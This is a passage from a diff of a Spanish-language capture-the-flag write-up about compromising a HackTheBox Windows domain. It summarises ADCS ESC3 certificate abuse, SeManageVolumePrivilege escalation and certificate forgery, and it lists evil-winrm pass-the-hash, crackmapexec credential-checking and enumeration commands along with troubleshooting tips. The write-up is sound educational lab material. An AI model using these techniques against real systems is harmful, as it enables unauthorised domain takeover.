-   - Podemos crear certificados válidos para cualquier usuario
-   - Windows confiará en estos certificados
-   - Permite autenticación completa sin conocer contraseñas
-
-### 7.5 Errores Comunes y Soluciones
-
-1. **Problema de mayúsculas en usuarios**:
-   - Windows convierte usernames a mayúsculas
-   - Probar diferentes combinaciones
-
-2. **Errores de sincronización de tiempo**:
-   - Usar `faketime` es más confiable que cambiar hora del sistema
-   - Siempre verificar la hora del DC antes de autenticarse
-
-3. **Problemas de descarga en Evil-WinRM**:
-   - El comando `download` es sensible a rutas
-   - Copiar archivos al directorio actual antes de descargar
-
-4. **IPs incorrectas**:
-   - Siempre verificar tu IP con `ip a | grep tun0`
-   - Los corchetes en IPs causan errores en PowerShell
-
-### 7.6 Comandos de Verificación Útiles
-
+#### Windows/PowerShell:
 ```powershell
-# En Windows
-whoami              # Usuario actual
-whoami /priv        # Privilegios
-hostname            # Nombre del servidor
-ipconfig /all       # Configuración de red
-net user            # Lista de usuarios
-
-# En Kali
-ip a | grep tun0    # Tu IP en la VPN
-date                # Hora actual del sistema
+whoami /priv              # Ver privilegios
+Get-ChildItem -Recurse    # Buscar archivos
+certutil -store my        # Ver certificados
+net user /domain          # Usuarios del dominio
 ```
 
-### 7.7 Flujo de Ataque Resumido
+#### Linux/Kali:
+```bash
+crackmapexec smb IP -u USER -p PASS    # Verificar credenciales
+faketime 'FECHA' comando                # Ejecutar con fecha falsa
+evil-winrm -i IP -u USER -H HASH        # Conectar con hash
+```
 
-1. **Reconocimiento** → SMB shares abiertos
-2. **Credenciales iniciales** → En archivo LICENSE
-3. **Acceso inicial** → WinRM con Lion.SK
-4. **Escalación horizontal** → ESC3 para obtener ryan.k
-5. **Escalación vertical** → SeManageVolumePrivilege + Certificate Forgery
-6. **Acceso total** → Administrator
+### 9.4 Errores Comunes y Soluciones
+
+1. **Usuario con formato incorrecto**
+   - Probar mayúsculas: Lion.SK en vez de lion.sk
+
+2. **Error de sincronización de tiempo**
+   - Usar faketime es más confiable
+   - Verificar hora exacta del DC
+
+3. **Descarga fallida en Evil-WinRM**
+   - Copiar archivo al directorio actual primero
+   - Evitar rutas complejas
+
+4. **IPs incorrectas en comandos**
+   - Verificar con: ip a | grep tun0
+   - No usar corchetes en PowerShell
+
+### 9.5 Herramientas Clave Utilizadas
+
+1. **Certipy**: Explotación de ADCS
+2. **Evil-WinRM**: Acceso remoto Windows
+3. **faketime**: Manipulación de tiempo
+4. **crackmapexec**: Verificación de credenciales
+5. **smbclient**: Acceso a shares SMB
+6. **John The Ripper**: Cracking de hashes
+7. **SeManageVolumeExploit**: Abuso de privilegio
+
+### 9.6 Referencias y Recursos
+
+- Certipy: https://github.com/ly4k/Certipy
+- ADCS Attacks: https://posts.specterops.io/certified-pre-owned-d95910965cd2
+- SeManageVolumeExploit: https://github.com/CsEnox/SeManageVolumeExploit
+- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
 
 ---
 
-## Recursos Adicionales
+## Notas Finales
 
-- **Certipy**: https://github.com/ly4k/Certipy
-- **ADCS Attacks**: https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
-- **SeManageVolumeExploit**: https://github.com/CsEnox/SeManageVolumeExploit
-- **Evil-WinRM**: https://github.com/Hackplayers/evil-winrm
+Este write-up documenta el proceso completo incluyendo:
+- Todos los comandos utilizados
+- Los errores encontrados y sus soluciones
+- Múltiples métodos probados (incluso los que fallaron)
+- Explicaciones detalladas para principiantes
 
----
+El objetivo es aprender no solo qué funcionó, sino también entender por qué funcionó y qué hacer cuando algo falla.
 
-**Nota**: Este write-up está diseñado para fines educativos. Úsalo solo en entornos autorizados como HackTheBox.
+**Importante**: Este documento es solo para fines educativos. Úsalo únicamente en entornos autorizados como HackTheBox.
